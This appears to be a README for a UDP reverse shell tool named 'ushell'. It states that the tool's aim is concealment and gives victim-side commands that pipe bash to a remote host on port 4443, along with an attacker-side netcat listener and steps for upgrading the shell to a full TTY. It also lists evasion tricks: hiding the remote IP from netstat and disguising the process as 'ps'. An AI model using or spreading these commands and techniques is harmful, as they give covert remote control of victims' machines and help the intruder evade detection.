# motivation
want to implenment a udp reverse shell with full shell property(support pty/tab/arrow..) and high degree of concealment.

# compile
make

# usage
## victim 
mkfifo fifo;./ushell -u 192.168.74.187 4443 < fifo | ./ushell -p bash -i >& fifo

## attacker
nc -ulvp 4443

# support tab/arrow/ctrl-c
ctrl-z //return to host
stty raw -echo
fg //return to shell
reset
// make beautiful
export SHELL=**
export TERM=**
stty rows ** columns ** 

# key property
+ udp socket without connect(thus hide remote ip from netstat)
+ cmd line hide as "ps"(thus hide remote ip from cmd line)
+ use forkpty() to provide a pty terminal

# other
we can also compile a bash staticly and hide its cmd line 
